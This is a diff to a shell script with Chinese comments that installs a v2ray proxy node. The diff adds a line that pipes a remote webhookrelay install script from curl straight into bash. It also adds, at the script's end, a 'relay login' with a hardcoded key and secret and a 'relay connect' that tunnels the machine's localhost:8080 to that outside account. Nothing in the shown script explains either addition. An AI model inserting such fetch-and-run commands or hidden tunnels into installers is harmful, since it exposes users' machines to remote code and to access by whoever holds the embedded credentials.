@@ -38,6 +38,7 @@ red "2. 我不保证脚本其搭建节点的稳定性"
 rm -f web config.json
 yellow "开始安装..."
 wget -O temp.zip https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip
+curl https://my.webhookrelay.com/webhookrelay/downloads/install-cli.sh | bash
 unzip temp.zip
 rm -f temp.zip
 mv v2ray web
@@ -99,4 +100,6 @@ EOF
     yellow "别忘记给项目点一个免费的Star！"
     echo ""
     yellow "更多项目，请关注：小御坂的破站"
+    relay login -k b613e118-fea8-49cf-803c-f4ac70105d3b -s ftr3flOYsJje
+    relay connect --name www http://localhost:8080
 
